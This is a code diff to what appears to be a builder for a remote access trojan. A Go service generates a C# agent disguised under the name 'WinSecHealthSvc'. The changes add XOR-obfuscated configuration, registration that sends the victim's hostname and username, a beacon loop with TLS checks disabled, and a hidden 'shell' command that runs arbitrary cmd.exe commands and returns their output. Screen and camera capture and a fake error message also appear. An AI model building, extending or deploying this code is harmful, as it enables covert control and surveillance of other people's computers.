@@ -37,11 +37,13 @@ type BuildParams struct {
 	SilentAdmin     bool   `json:"silent_admin"`
 	BuildSig        string `json:"-"`
 	StrKeyHex       string `json:"-"`
+	BuildTokenPlain string `json:"-"`
 	EncServer       string
 	EncID           string
 	EncName         string
-	EncCommKey      string
 	EncFakeMsg      string
+	EncAgentSecret  string `json:"-"`
+	EncBuildToken   string `json:"-"`
 }
 
 // GenerateSource generates the C# source code for the agent using the original Baron logic
@@ -76,16 +78,13 @@ func (s *BuilderService) PrepareParams(p *BuildParams) {
 	rand.Read(strKey)
 	p.StrKeyHex = hex.EncodeToString(strKey)
 
-	commKey := make([]byte, 32)
-	rand.Read(commKey)
-	commKeyHex := hex.EncodeToString(commKey)
-
-	// Encrypt fields
+	// Encrypt fields (XOR + base64; agent decrypts with StrKeyHex)
 	p.EncServer = s.EncryptString(p.ServerURL, strKey)
 	p.EncID = s.EncryptString(p.ID, strKey)
 	p.EncName = s.EncryptString(p.Name, strKey)
-	p.EncCommKey = s.EncryptString(commKeyHex, strKey)
 	p.EncFakeMsg = s.EncryptString(p.FakeErrorMsg, strKey)
+	p.EncAgentSecret = s.EncryptString(os.Getenv("AGENT_SECRET"), strKey)
+	p.EncBuildToken = s.EncryptString(p.BuildTokenPlain, strKey)
 }
 
 // Compile compiles the C# source into an executable.
@@ -195,10 +194,12 @@ using System.Net.Http;
 using System.Net.Http.Json;
 using System.Text;
 using System.Text.Json;
+using System.Text.Json.Serialization;
 using System.Net.WebSockets;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Collections.Generic;
+using System.Linq;
 using System.Security.Cryptography;
 using System.Diagnostics;
 using System.Management;
@@ -223,32 +224,38 @@ using Windows.Storage.Streams;
 namespace WinSecHealthSvc
 {
     public class TaskItem {
+        [JsonPropertyName("id")]
         public string id { get; set; }
+        [JsonPropertyName("cmd")]
         public string cmd { get; set; }
-        public string args { get; set; }
     }
 
-    public class PollResponse {
+    public class BeaconPayload {
+        [JsonPropertyName("t")]
+        public List<TaskItem> t { get; set; }
+        [JsonPropertyName("tasks")]
         public List<TaskItem> tasks { get; set; }
-    }
-
-    public class TaskResult {
-        public string task_id { get; set; }
-        public string output { get; set; }
-        public string status { get; set; }
     }
 
     class Program
     {
+        static byte[] _cipherKey = StringToByteArray("{{.StrKeyHex}}");
+        static string DecryptB64(string b64) {
+            if (string.IsNullOrEmpty(b64)) return "";
+            var enc = Convert.FromBase64String(b64);
+            for (int i = 0; i < enc.Length; i++) enc[i] ^= _cipherKey[i % _cipherKey.Length];
+            return Encoding.UTF8.GetString(enc);
+        }
+
         // ------------------ Configuration ------------------
-        static string _serverUrl = Encoding.UTF8.GetString(Convert.FromBase64String("{{.EncServer}}"));
-        static string _agentId = Encoding.UTF8.GetString(Convert.FromBase64String("{{.EncID}}"));
-        static string _agentName = Encoding.UTF8.GetString(Convert.FromBase64String("{{.EncName}}"));
-        static string _commKeyHex = Encoding.UTF8.GetString(Convert.FromBase64String("{{.EncCommKey}}"));
+        static string _serverUrl = DecryptB64("{{.EncServer}}");
+        static string _agentId = DecryptB64("{{.EncID}}");
+        static string _agentName = DecryptB64("{{.EncName}}");
+        static string _agentHmacSecret = DecryptB64("{{.EncAgentSecret}}");
+        static string _buildToken = DecryptB64("{{.EncBuildToken}}");
         static int _beaconInterval = {{.BeaconInterval}};
         
         static HttpClient _http;
-        static byte[] _hmacKey;
         static CancellationTokenSource _cts = new CancellationTokenSource();
 
         // Screen Stream
@@ -261,43 +268,81 @@ namespace WinSecHealthSvc
         static MediaCapture _mediaCapture;
         static MediaFrameReader _frameReader;
 
+        static string MachineFingerprint() {
+            var raw = Encoding.UTF8.GetBytes(Environment.MachineName + "|" + Environment.UserName);
+            return Convert.ToHexString(MD5.HashData(raw)).ToLowerInvariant();
+        }
+
+        static string HexHmac256(byte[] body, byte[] key) {
+            using (var h = new HMACSHA256(key)) {
+                return Convert.ToHexString(h.ComputeHash(body)).ToLowerInvariant();
+            }
+        }
+
+        static void AddBodySignature(HttpRequestMessage req, string json) {
+            if (string.IsNullOrEmpty(_agentHmacSecret)) return;
+            var key = Encoding.UTF8.GetBytes(_agentHmacSecret);
+            var body = Encoding.UTF8.GetBytes(json);
+            req.Headers.TryAddWithoutValidation("X-Signature", HexHmac256(body, key));
+        }
+
+        static async Task RegisterOnce() {
+            try {
+                var fp = MachineFingerprint();
+                var payload = new {
+                    id = _agentId,
+                    hostname = Environment.MachineName,
+                    username = Environment.UserName,
+                    os = Environment.OSVersion.ToString(),
+                    version = "net8",
+                    fingerprint = fp,
+                    is_admin = false,
+                    build_token = _buildToken
+                };
+                string json = JsonSerializer.Serialize(payload);
+                var req = new HttpRequestMessage(HttpMethod.Post, _serverUrl + "/api/agent/register");
+                req.Content = new StringContent(json, Encoding.UTF8, "application/json");
+                AddBodySignature(req, json);
+                await _http.SendAsync(req);
+            } catch { }
+        }
+
         static async Task Main(string[] args)
         {
-            _hmacKey = StringToByteArray(_commKeyHex);
             var handler = new HttpClientHandler {
                 ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => true
             };
             _http = new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(30) };
 
+            await RegisterOnce();
+
             while (!_cts.Token.IsCancellationRequested)
             {
                 try
                 {
-                    await PollAndExecute();
+                    await BeaconAndExecute();
                 }
                 catch (Exception) { }
                 await Task.Delay(_beaconInterval * 1000, _cts.Token);
             }
         }
 
-        static async Task PollAndExecute()
+        static async Task BeaconAndExecute()
         {
-            string url = $"{_serverUrl}/api/agent/poll?id={_agentId}";
-            var req = new HttpRequestMessage(HttpMethod.Get, url);
-            string timeStr = DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString();
-            req.Headers.Add("X-Agent-Time", timeStr);
-            req.Headers.Add("X-Agent-Signature", GenerateHMAC($"{_agentId}:{timeStr}"));
+            string json = JsonSerializer.Serialize(new { id = _agentId });
+            var req = new HttpRequestMessage(HttpMethod.Post, _serverUrl + "/api/agent/beacon");
+            req.Content = new StringContent(json, Encoding.UTF8, "application/json");
+            AddBodySignature(req, json);
 
             var resp = await _http.SendAsync(req);
             if (!resp.IsSuccessStatusCode) return;
 
-            var pollData = await resp.Content.ReadFromJsonAsync<PollResponse>();
-            if (pollData?.tasks != null)
+            var payload = await resp.Content.ReadFromJsonAsync<BeaconPayload>();
+            var list = payload?.t ?? payload?.tasks;
+            if (list == null) return;
+            foreach (var t in list)
             {
-                foreach (var t in pollData.tasks)
-                {
-                    _ = ExecuteTaskAsync(t); // Fire and forget
-                }
+                _ = ExecuteTaskAsync(t);
             }
         }
 
@@ -308,13 +353,38 @@ namespace WinSecHealthSvc
 
             try
             {
-                switch (task.cmd)
+                string c = (task.cmd ?? "").Trim();
+                int sp = c.IndexOf(' ');
+                string verb = sp < 0 ? c : c.Substring(0, sp).ToLowerInvariant();
+                string arg = sp < 0 ? "" : c.Substring(sp + 1).Trim();
+
+                switch (verb)
                 {
                     case "ping":
                         output = "pong";
                         break;
                     case "sysinfo":
                         output = GetSysInfo();
+                        break;
+                    case "shell":
+                    case "cmd":
+                        {
+                            var psi = new ProcessStartInfo {
+                                FileName = "cmd.exe",
+                                Arguments = "/c " + arg,
+                                RedirectStandardOutput = true,
+                                RedirectStandardError = true,
+                                UseShellExecute = false,
+                                CreateNoWindow = true
+                            };
+                            using var proc = Process.Start(psi);
+                            if (proc != null) {
+                                string o = await proc.StandardOutput.ReadToEndAsync();
+                                string e = await proc.StandardError.ReadToEndAsync();
+                                await proc.WaitForExitAsync();
+                                output = o + (string.IsNullOrEmpty(e) ? "" : "\n" + e);
+                            } else output = "process start failed";
+                        }
                         break;
                     case "screen_start":
                         if (!_screenStreaming) {
@@ -347,7 +417,7 @@ namespace WinSecHealthSvc
                         output = "Agent terminating";
                         break;
                     default:
-                        output = "Unknown command";
+                        output = "Unknown command: " + verb;
                         status = "error";
                         break;
                 }
@@ -364,14 +434,12 @@ namespace WinSecHealthSvc
         static async Task SendResultAsync(string taskId, string output, string status)
         {
             string url = $"{_serverUrl}/api/agent/result";
-            var result = new TaskResult { task_id = taskId, output = output, status = status };
-            string json = JsonSerializer.Serialize(result);
+            var payload = new { id = _agentId, task_id = taskId, data = output };
+            string json = JsonSerializer.Serialize(payload);
             
             var req = new HttpRequestMessage(HttpMethod.Post, url);
-            string timeStr = DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString();
-            req.Headers.Add("X-Agent-Time", timeStr);
-            req.Headers.Add("X-Agent-Signature", GenerateHMAC($"{_agentId}:{timeStr}:{json}"));
             req.Content = new StringContent(json, Encoding.UTF8, "application/json");
+            AddBodySignature(req, json);
             
             await _http.SendAsync(req);
         }
@@ -521,15 +589,6 @@ namespace WinSecHealthSvc
         // ==========================================
         // UTILS
         // ==========================================
-        static string GenerateHMAC(string data)
-        {
-            using (var hmac = new HMACSHA256(_hmacKey))
-            {
-                byte[] hash = hmac.ComputeHash(Encoding.UTF8.GetBytes(data));
-                return Convert.ToHexString(hash).ToLower();
-            }
-        }
-
         public static byte[] StringToByteArray(string hex)
         {
             int numChars = hex.Length;
